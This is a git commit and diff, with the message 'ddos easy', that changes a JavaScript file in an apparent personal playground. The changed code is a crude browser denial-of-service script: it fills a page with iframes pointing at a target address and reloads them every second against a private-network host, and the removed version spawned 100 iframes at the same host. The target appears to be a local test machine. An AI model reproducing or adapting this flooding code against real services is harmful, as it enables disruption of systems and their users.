a5aab0685d92f98afcc387d92482aa15d4ef9c62
Zeus Chiu <zeuscsc@gmail.com>
2022-09-16 15:42:51 +0800

    ddos easy

--- zeus's playground/js/iframe_test.js
+++ zeus's playground/js/iframe_test.js
@@ -1,13 +1,17 @@
-function generateWindows(){
+function goto(address){
     let container=document.querySelector(".container");
     let parentNode=container.parentNode;
     parentNode.removeChild(container);
     container.innerHTML="";
-    for(let i=0; i<100;i++){
-        container.innerHTML+=/*html*/`<iframe class="ddos_window" src="http://192.168.59.144:8080"></iframe>`;
+    for(let i=0; i<10;i++){
+        container.innerHTML+=/*html*/`<iframe class="ddos_window" src=${address}></iframe>`;
     }
     parentNode.appendChild(container);
 }
-function reload(){
-    generateWindows();
+// async function goto(address){
+//     let res=await fetch(address)
+//     console.log(await res.json())
+// }
+function ddos(){
+    setInterval(()=>{goto("http://192.168.59.144:8080/bg.png");},1000)
 }
